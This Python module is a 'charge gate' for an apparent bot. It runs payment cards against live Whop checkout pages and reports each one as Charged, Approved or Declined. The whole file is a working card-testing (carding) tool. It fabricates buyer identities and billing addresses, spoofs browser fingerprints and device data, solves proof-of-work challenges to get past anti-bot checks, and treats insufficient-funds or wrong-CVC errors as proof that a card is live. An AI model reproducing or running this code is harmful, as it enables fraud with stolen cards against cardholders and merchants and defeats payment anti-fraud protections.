"""
Whop Checkout Charge Gate
Converted from standalone Whop checker to bot-compatible async gate module.
"""

import hashlib
import os
import time
import uuid
import json
import random
import string
import asyncio
import re
from typing import Optional, Dict, Any, List, Tuple
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs

import httpx


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  RANDOM IDENTITY
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_FIRST = ["james","john","robert","michael","william","david","richard","joseph",
          "thomas","charles","emma","olivia","ava","isabella","sophia","mia",
          "charlotte","amelia","harper","evelyn"]
_LAST = ["smith","johnson","williams","brown","jones","garcia","miller","davis",
         "wilson","taylor","anderson","thomas","jackson","white","harris","martin"]
_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","icloud.com"]

def _rand_identity() -> tuple:
    first = random.choice(_FIRST).capitalize()
    last = random.choice(_LAST).capitalize()
    tag = "".join(random.choices(string.digits, k=random.randint(2, 5)))
    email = f"{first.lower()}{last.lower()}{tag}@{random.choice(_DOMAINS)}"
    phone = f"+1{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
    return first, last, email, phone

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  RANDOM UA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
]

def _rand_ua() -> str:
    return random.choice(_UA_POOL)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  TRACE / SPAN / BAGGAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def gen_trace() -> str:
    return str(uuid.uuid4()).replace("-", "")

def gen_span() -> str:
    return uuid.uuid4().hex[:16]

def gen_baggage(trace_id: str, release: str) -> str:
    return (
        f"sentry-environment=production,sentry-release={release},"
        f"sentry-public_key=c6989961c9181cc2db941b290d874f29,"
        f"sentry-trace_id={trace_id},sentry-org_id=1320754,"
        f"sentry-sampled=true,sentry-sample_rand={str(uuid.uuid4().int % 10000000000000000 / 10000000000000000)[:17]},"
        f"sentry-sample_rate=1"
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  FINGERPRINT BYPASS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FP_V1_STR = '{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36","language":"en-US","resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":-300,"navigator_platform":"Win32","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"touch_support":[1,true,true],"js_fonts":["Arial","Calibri","Cambria","Consolas","Courier New","Georgia","Helvetica","Impact","Tahoma","Times New Roman","Trebuchet MS","Verdana"]}'
FP_V1S_STR = '{"language":"en-US","resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":-300,"navigator_platform":"Win32","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"touch_support":[1,true,true],"js_fonts":["Arial","Calibri","Cambria","Consolas","Courier New","Georgia","Helvetica","Impact","Tahoma","Times New Roman","Trebuchet MS","Verdana"]}'
FP_V2_STR = '{"fonts":["Arial","Calibri","Cambria","Consolas","Courier New","Georgia","Helvetica","Impact","Tahoma","Times New Roman","Trebuchet MS","Verdana"],"font_preferences":{"default":120,"apple":120,"serif":120,"sans":115,"mono":97,"min":7,"system":118},"audio":124.04347527516074,"screen_frame":[0,0,50,0],"languages":[["en-US"]],"device_memory":8,"screen_resolution":[1080,1920],"hardware_concurrency":8,"timezone":"America/New_York","indexed_db":true,"open_database":false,"platform":"Win32","plugins":[{"name":"PDF Viewer","description":"Portable Document Format","mimeTypes":[{"type":"application/pdf","suffixes":"pdf"}]}],"canvas":{"winding":true},"touch_support":{"maxTouchPoints":1,"touchEvent":true,"touchStart":true},"vendor_flavors":["chrome"],"color_gamut":"srgb","forced_colors":false,"monochrome":0,"contrast":0,"reduced_motion":false,"hdr":false}'

def _rand_fp(ua: str):
    _US_TZ = [
        ("America/New_York", -300, "en-US,en;q=0.9"),
        ("America/Chicago", -360, "en-US,en;q=0.9"),
        ("America/Denver", -420, "en-US,en;q=0.9"),
        ("America/Los_Angeles", -480, "en-US,en;q=0.9"),
    ]
    _SCREEN = [(1920, 1080, 1920, 1040), (1366, 768, 1366, 728), (1536, 864, 1536, 824)]

    tz_name, tz_off, lang = random.choice(_US_TZ)
    sw, sh, aw, ah = random.choice(_SCREEN)
    hw = random.choice([4, 6, 8, 12, 16])
    mem = random.choice([4, 8, 16])
    lt = lang.split(",")[0]

    def rh() -> str:
        return "".join(random.choices("0123456789abcdef", k=32))

    h1, h1s, h2 = rh(), rh(), rh()

    v1 = (FP_V1_STR
          .replace('"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"', f'"user_agent":{json.dumps(ua)}')
          .replace('"language":"en-US"', f'"language":"{lt}"')
          .replace('"timezone_offset":-300', f'"timezone_offset":{tz_off}')
          .replace('"resolution":[1920,1080]', f'"resolution":[{sw},{sh}]')
          .replace('"available_resolution":[1920,1040]', f'"available_resolution":[{aw},{ah}]'))
    v1s = (FP_V1S_STR
           .replace('"language":"en-US"', f'"language":"{lt}"')
           .replace('"timezone_offset":-300', f'"timezone_offset":{tz_off}')
           .replace('"resolution":[1920,1080]', f'"resolution":[{sw},{sh}]')
           .replace('"available_resolution":[1920,1040]', f'"available_resolution":[{aw},{ah}]'))
    v2 = (FP_V2_STR
          .replace('"languages":[["en-US"]]', f'"languages":[["{lt}"]]')
          .replace('"device_memory":8', f'"device_memory":{mem}')
          .replace('"screen_resolution":[1080,1920]', f'"screen_resolution":[{sh},{sw}]')
          .replace('"hardware_concurrency":8', f'"hardware_concurrency":{hw}')
          .replace('"timezone":"America/New_York"', f'"timezone":"{tz_name}"'))

    return v1, v1s, v2, h1, h1s, h2, tz_name, tz_off, lang, sw, sh

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  EXTRACTOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def extract_dynamic(html: str):
    next_data = None
    m = re.search(r'<script id="__NEXT_DATA__" type="application/json">(.*?)</script>', html)
    if m:
        try:
            next_data = json.loads(m.group(1))
        except:
            pass

    def rec(obj, pat):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(v, str):
                    mm = re.search(pat, v)
                    if mm:
                        return mm.group(0)
                elif isinstance(v, (dict, list)):
                    res = rec(v, pat)
                    if res:
                        return res
        elif isinstance(obj, list):
            for item in obj:
                res = rec(item, pat)
                if res:
                    return res
        return None

    def find_plan(obj):
        if isinstance(obj, dict):
            if obj.get("id", "").startswith("plan_") and ("formattedPeriodV2" in obj or "initialPrice" in obj or "rawInitialPrice" in obj):
                return obj.get("id")
            for k, v in obj.items():
                res = find_plan(v)
                if res:
                    return res
        elif isinstance(obj, list):
            for item in obj:
                res = find_plan(item)
                if res:
                    return res
        return None

    plan_id = account_id = bt_key = container = release = None

    if next_data:
        plan_id = find_plan(next_data) or rec(next_data, r'plan_[a-zA-Z0-9]+')
        account_id = rec(next_data, r'biz_[a-zA-Z0-9]+')
        bt_key = rec(next_data, r'key_prod_us_pub_[a-zA-Z0-9]+')
        container = rec(next_data, r'/?\\?/?card-assembly/[a-zA-Z0-9]+/?\\?/?')
        if container:
            container = container.replace('\\', '')
        release = rec(next_data, r'"release":"([a-f0-9]{40})"')

    if not plan_id:
        plan_id = (re.findall(r'plan_[a-zA-Z0-9]+', html) or [None])[0]
    if not account_id:
        account_id = (re.findall(r'biz_[a-zA-Z0-9]+', html) or [None])[0]
    if not bt_key:
        m2 = re.search(r'key_prod_us_pub_[a-zA-Z0-9]+', html)
        if m2:
            bt_key = m2.group(0)
    if not container:
        m2 = re.search(r'/card-assembly/[a-zA-Z0-9]+/', html)
        if m2:
            container = m2.group(0)
    if not release:
        m2 = re.search(r'"release":"([a-f0-9]{40})"', html) or re.search(r'"buildId":"([a-f0-9]{40})"', html)
        if m2:
            release = m2.group(1)

    return plan_id, account_id, bt_key, container, release or "unknown"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  RESPONSE PARSER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_message(resp: Any) -> Optional[str]:
    if not isinstance(resp, dict):
        return None

    for key in ("last_confirmation_error", "last_confirm_error"):
        lce = resp.get(key)
        if isinstance(lce, dict):
            msg = lce.get("message")
            if msg:
                return msg

    payment = resp.get("payment")
    if isinstance(payment, dict):
        for k in ("last_payment_error", "error"):
            lpe = payment.get(k)
            if isinstance(lpe, dict):
                msg = lpe.get("message")
                if msg:
                    return msg

        if payment.get("decline_code"):
            return f"Declined: {payment['decline_code']}"

        if payment.get("status", "").lower() in ("failed", "declined", "canceled"):
            return payment.get("message") or payment["status"]

    if resp.get("decline_code"):
        return f"Declined: {resp['decline_code']}"

    if resp.get("status", "").lower() in ("failed", "declined", "canceled"):
        return resp.get("message") or resp["status"]

    return None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  HEADERS BUILDER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _base_headers(ua: str, referer: str, release: str, ssk: str = "") -> dict:
    trace = gen_trace()
    return {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "api-version-date": "2026-09-23",
        "origin": "https://whop.com",
        "referer": referer,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "priority": "u=1, i",
        "sentry-trace": f"{trace}-{gen_span()}-1",
        "baggage": gen_baggage(trace, release),
        "whop-private-schema": "true",
        "x-fern-language": "JavaScript",
        "x-fern-runtime": "browser",
        "x-fern-runtime-version": ua,
        "user-agent": ua,
        "x-ssk": ssk,
    }

def _json_headers(ua: str, referer: str, release: str, ssk: str = "") -> dict:
    h = _base_headers(ua, referer, release, ssk)
    h["content-type"] = "application/json"
    return h

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  POW BYPASS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def solve_pow(base: str, prefix: str, suffix: str, max_iter: int = 500_000) -> Optional[int]:
    for i in range(1, max_iter):
        if hashlib.sha256(f"{base}:{i}:{suffix}".encode()).hexdigest().startswith(prefix):
            return i
    return None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  MAIN PROCESS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _run_with_client(
    client: httpx.AsyncClient,
    url: str,
    cc: str, mes: str, ano: str, cvv: str,
    proxy: Optional[str] = None,
) -> Optional[Dict[str, Any]]:

    # ─── RANDOM IDENTITY
    first_name, last_name, email, phone = _rand_identity()
    ua = _rand_ua()

    # ─── FINGERPRINT BYPASS
    v1_str, v1s_str, v2_str, h1, h1s, h2, tz_name, tz_off, lang, sw, sh = _rand_fp(ua)

    # ─── SSK
    ssk = ""
    try:
        ssk_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "ssk.txt")
        with open(ssk_path, encoding='utf-8', errors='ignore') as f:
            ssk = f.read().strip()
    except:
        pass

    parsed = urlparse(url)
    affiliate = parse_qs(parsed.query).get("a", [""])[0]
    referer = url

    # ─── STEP 1: Landing page
    headers1 = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": ua,
    }
    r1 = await client.get(url, headers=headers1)
    html = r1.text

    plan_id, account_id, bt_key, container, release = extract_dynamic(html)
    if not bt_key:
        bt_key = "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR"
    if not plan_id or not account_id:
        return {"error": "Missing plan/account"}

    # ─── STEP 2: users/me
    await client.get("https://whop.com/api/v1/users/me",
                     headers=_base_headers(ua, referer, release, ssk))

    # ─── STEP 3: checkout_sessions
    payload3 = {
        "items": [{"plan": plan_id, "quantity": 1}],
        "affiliate_code": affiliate,
        "attribution": {"source": "product_page_direct"},
        "tracking_link_ids_by_account": {},
        "payment_method_types": ["card"],
        "mode": "payment",
        "buyer_email": email
    }
    r3 = await client.post("https://whop.com/api/v1/checkout_sessions",
                           json=payload3,
                           headers=_json_headers(ua, referer, release, ssk))
    if r3.status_code >= 400:
        try:
            err_data = r3.json()
            err_msg = err_data.get("error", {}).get("message", "") or f"{r3.status_code} {r3.text[:100]}"
        except Exception:
            err_msg = f"{r3.status_code} {r3.text[:100]}"
        return {"error": f"{r3.status_code} {err_msg}"}
    data3 = r3.json()
    chs_id = data3["id"]
    client_secret = data3["client_secret"]
    account_id = data3.get("seller", {}).get("id", account_id)

    # Extract price from checkout session quote/breakdown
    _checkout_price = "-"
    try:
        quote = data3.get("quote") or {}
        breakdown = quote.get("breakdown") or {}
        # Get the recurring/upcoming price (subscription amount)
        upcoming = breakdown.get("upcoming") or []
        if upcoming and isinstance(upcoming, list):
            up_amt = upcoming[0].get("amount", {})
            amt_str = up_amt.get("amount", "")
            if amt_str and amt_str != "0.00":
                _checkout_price = f"${amt_str}"
        # If no upcoming price, use the total due today
        if _checkout_price == "-":
            total = breakdown.get("total", {})
            total_str = total.get("amount", "")
            if total_str and total_str != "0.00":
                _checkout_price = f"${total_str}"
        # Fallback: try display headline context
        if _checkout_price == "-":
            display = breakdown.get("display", {})
            headline = display.get("headline", {})
            ctx = headline.get("context") or []
            if ctx:
                amt_obj = ctx[0].get("amount", {})
                amt_val = amt_obj.get("amount", "")
                if amt_val and amt_val != "0.00":
                    _checkout_price = f"${amt_val}"
            # Last resort: headline text like "3 days free"
            if _checkout_price == "-" and headline.get("text"):
                _checkout_price = headline["text"]
    except Exception:
        pass

    # ─── STEP 4: payment_method_types
    await client.get(
        f"https://whop.com/api/v1/payment_method_types?account_id={account_id}&surface=direct_checkout&plan_id={plan_id}",
        headers=_base_headers(ua, referer, release, ssk)
    )

    # ─── STEP 5: calculate_breakdown
    r5_bd = await client.post(
        f"https://whop.com/api/v1/checkout_sessions/{chs_id}/calculate_breakdown",
        json={"client_secret": client_secret, "supports_buyer_fee": True},
        headers=_json_headers(ua, referer, release, ssk)
    )
    try:
        bd = r5_bd.json()
        _bd_total = bd.get("total") or bd.get("amount") or bd.get("subtotal")
        if _bd_total and isinstance(_bd_total, (int, float)):
            _checkout_price = f"${_bd_total/100:.2f}" if _bd_total > 100 else f"${_bd_total:.2f}"
        elif isinstance(_bd_total, str) and _bd_total:
            _checkout_price = _bd_total if "$" in _bd_total else f"${_bd_total}"
    except Exception:
        pass

    # ─── STEP 6: recognize
    await client.post(
        "https://whop.com/api/v1/session_intents/recognize",
        json={"email": email},
        headers=_json_headers(ua, referer, release, ssk)
    )

    # ─── STEP 7: BT session (Basis Theory)
    device_info = {
        "uaBrands": [
            {"brand": "Not?A_Brand", "version": "8"},
            {"brand": "Chromium", "version": "141"},
            {"brand": "Google Chrome", "version": "141"}
        ],
        "uaMobile": False,
        "uaPlatform": "Windows",
        "languages": ["en-US", "en"],
        "timeZone": tz_name,
        "cookiesEnabled": True,
        "localStorageEnabled": True,
        "sessionStorageEnabled": True,
        "platform": "Win32",
        "hardwareConcurrency": 8,
        "deviceMemoryGb": 8,
        "screenWidth": sw,
        "screenHeight": sh,
        "screenAvailWidth": sw,
        "screenAvailHeight": sh,
        "innerWidth": sw,
        "innerHeight": sh - 100,
        "devicePixelRatio": 1,
        "maxTouchPoints": 0,
        "network": {},
        "plugins": [],
        "mimeTypes": [],
        "webdriver": False,
        "suspectedHeadless": False,
        "webglVendor": "Google Inc. (Intel)",
        "webglRenderer": "ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0)"
    }
    headers7 = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://js.basistheory.com",
        "referer": "https://js.basistheory.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": ua,
        "bt-api-key": bt_key,
    }
    r7 = await client.post("https://js.basistheory.com/api/sessions",
                           json={"deviceInfo": device_info},
                           headers=headers7)
    nonce = None
    if r7.text:
        try:
            nonce = r7.json().get("nonce")
        except:
            pass

    # ─── STEP 8: Card session
    r8 = await client.post(
        "https://whop.com/api/v1/payment_method_types/card/session",
        json={"account_id": account_id, "origin": "https://whop.com", "nonce": nonce},
        headers=_json_headers(ua, referer, release, ssk)
    )
    if r8.text:
        try:
            d8 = r8.json()
            sc = d8.get("session", {}).get("container")
            if sc:
                container = sc if sc.startswith('/') else '/' + sc
                if not container.endswith('/'):
                    container += '/'
        except:
            pass
    if not container:
        container = "/card-assembly/cda4721bfd122ff8420a0bf4f47ea32e14125ef7d90d933bacb1a0b7fa9e82dd/"

    # ─── STEP 9: BT tokenize
    expires = (datetime.utcnow() + timedelta(minutes=5)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
    headers9 = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://js.basistheory.com",
        "referer": "https://js.basistheory.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": ua,
        "bt-api-key": bt_key,
    }
    r9 = await client.post("https://js.basistheory.com/api/tokens",
                           json={
                               "type": "card",
                               "containers": [container],
                               "expires_at": expires,
                               "data": {"number": cc}
                           },
                           headers=headers9)
    card_token = None
    if r9.text:
        try:
            card_token = r9.json().get("id") or r9.json().get("token")
        except:
            pass
    if not card_token:
        return {"error": "No card token", "_price": _checkout_price}

    # ─── STEP 10: confirmation_tokens
    exp_year = int(ano)
    if exp_year < 100:
        exp_year += 2000

    payload10 = {
        "account_id": account_id,
        "payment_method": {
            "type": "card",
            "category": "card",
            "card": {"token": card_token}
        },
        "billing_details": {
            "email": email,
            "name": f"{first_name} {last_name}",
            "address": {
                "country": "US",
                "line1": f"{random.randint(100,9999)} Main St",
                "city": "New York",
                "state": "NY",
                "postal_code": f"{random.randint(10000,99999)}"
            }
        },
        "return_url": url,
        "setup_future_usage": "off_session",
        "browser_info": {
            "platform": "Win32",
            "color_depth": 24,
            "screen_height": sh,
            "screen_width": sw,
            "javascript_enabled": True,
            "language": "en-US",
            "java_enabled": False,
            "browser_time_difference": tz_off
        }
    }
    headers10 = _json_headers(ua, referer, release, ssk)
    headers10["authorization"] = "Bearer public"

    r10 = await client.post("https://whop.com/api/v1/confirmation_tokens",
                            json=payload10,
                            headers=headers10)
    ctok_id = None
    if r10.text:
        try:
            ctok_id = r10.json().get("id")
        except:
            pass
    if not ctok_id:
        try:
            err_data = r10.json()
            msg = get_message(err_data)
            if msg:
                return {"error": msg, "_price": _checkout_price}
        except:
            pass
        return {"error": "No confirmation token", "_price": _checkout_price}

    # ─── STEP 11: confirm
    payload11 = {
        "client_secret": client_secret,
        "confirmation_token": ctok_id,
        "attestations": {"tos_accepted": True}
    }
    r11 = await client.post(
        f"https://whop.com/api/v1/checkout_sessions/{chs_id}/confirm",
        json=payload11,
        headers=_json_headers(ua, referer, release, ssk)
    )
    if r11.text:
        try:
            confirm_data = r11.json()
            msg = get_message(confirm_data)
            if msg:
                return {"error": msg, "_price": _checkout_price}
        except:
            pass

    # ─── STEP 12: Poll
    for _ in range(12):
        r12 = await client.get(
            f"https://whop.com/api/v1/checkout_sessions/{chs_id}",
            params={"client_secret": client_secret, "expand[]": "payment"},
            headers=_base_headers(ua, referer, release, ssk)
        )
        if r12.text:
            try:
                cs = r12.json()
                msg = get_message(cs)
                if msg:
                    return {"error": msg, "_price": _checkout_price}
                next_action = cs.get("next_action")
                if isinstance(next_action, dict):
                    t = next_action.get("type", "")
                    if t in ("use_stripe_sdk", "redirect_to_url", "3ds"):
                        return {"error": "3D Secure", "_price": _checkout_price}
                payment = cs.get("payment") or {}
                if isinstance(payment, dict):
                    if payment.get("status", "").lower() in ("succeeded", "paid"):
                        return {"success": True, "data": payment, "_price": _checkout_price}
                    if payment.get("status", "").lower() in ("requires_action", "requires_confirmation"):
                        return {"error": "3D Secure / Processing", "_price": _checkout_price}
            except:
                pass
        await asyncio.sleep(2)

    return {"error": "Open/Processing", "_price": _checkout_price}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  BOT-COMPATIBLE WRAPPER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _classify_whop_result(result: Optional[Dict]) -> tuple:
    """Classify raw whop result into (status, message, price)."""
    if result is None:
        return "Error", "No response", "-"
    # Extract price from the result (set by _run_with_client)
    _price = result.get("_price", "-") or "-"
    if result.get("error"):
        err = result["error"]
        err_lower = err.lower()
        if "3d secure" in err_lower or "requires_action" in err_lower:
            return "3DS", err, _price
        if "insufficient" in err_lower or "not enough" in err_lower:
            return "Approved", f"insufficient_funds: {err}", _price
        if "cvv" in err_lower or "cvc" in err_lower:
            return "Approved", f"incorrect_cvc: {err}", _price
        if "expired" in err_lower:
            return "Declined", f"expired_card: {err}", _price
        if "declined" in err_lower or "decline" in err_lower:
            return "Declined", err, _price
        if "rate limit" in err_lower:
            return "Error", f"rate_limited: {err}", _price
        return "Declined", err, _price
    if result.get("success"):
        # Try to extract amount from payment data
        payment = result.get("data", {})
        amount = payment.get("amount", "")
        currency = payment.get("currency", "USD").upper()
        if amount:
            try:
                price = f"${float(amount)/100:.2f}" if isinstance(amount, (int, float)) else f"${amount}"
            except:
                price = str(amount)
        else:
            price = _price
        return "Charged", "Payment Successful", price
    return "Error", str(result)[:200], _price


async def whop_check(card_str: str, url: str, proxy_str: str = None) -> dict:
    """
    Check a card against Whop checkout.

    Args:
        card_str: Card in format "cc|mm|yy|cvv"
        url: Whop product URL
        proxy_str: Optional proxy URL

    Returns:
        dict with keys: status, message, price, card, gateway
        status: 'Charged', 'Approved', 'Declined', 'Error', '3DS'
    """
    parts = card_str.split("|")
    if len(parts) != 4:
        return {'status': 'Error', 'message': 'Invalid card format', 'card': card_str, 'gateway': 'Whop', 'price': '-'}

    cc, mes, ano, cvv = [p.strip() for p in parts]
    if len(ano) == 2:
        ano = "20" + ano

    if not url.startswith("http"):
        url = "https://" + url

    kw = {"timeout": 30, "follow_redirects": True}
    if proxy_str:
        kw["proxy"] = proxy_str

    try:
        async with httpx.AsyncClient(**kw) as client:
            result = await _run_with_client(client, url, cc, mes, ano, cvv, proxy_str)
            status, message, price = _classify_whop_result(result)
            return {
                'status': status,
                'message': message,
                'card': card_str,
                'gateway': 'Whop',
                'price': price,
            }
    except Exception as e:
        return {
            'status': 'Error',
            'message': str(e)[:150],
            'card': card_str,
            'gateway': 'Whop',
            'price': '-',
        }
